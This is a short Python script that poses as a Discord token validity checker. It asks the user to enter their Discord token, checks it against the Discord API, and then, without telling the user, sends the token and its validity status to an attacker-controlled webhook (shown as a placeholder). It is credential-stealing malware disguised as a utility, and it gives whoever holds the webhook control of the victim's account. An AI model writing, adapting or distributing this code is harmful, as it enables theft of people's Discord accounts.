import requests
import discord
from dhooks import Webhook

token = input(f'Discord Token -> ')
client = discord.Client()

link = f'https://discord.com/api/v9/users/@me'
headers = {'Authorization': f'{token}'}
codes = [200, 201, 204]
api = f'webhook here'

def checktoken():
    r = requests.get(link, headers = headers)
    if r.status_code in codes:
        return 'Valid Token | User Token'
    else:
        return 'Invalid Token'
tokentype = checktoken()
if tokentype == 'Valid Token | User Token':
    valid = f'True'
elif tokentype == 'Invalid Token':
    valid = f'False'
def log():
    webhook = Webhook(api)
    webhook.send(f'''```yaml
Token Type: {tokentype}
Token Entered: {token}
Valid: {valid}```''')
log()
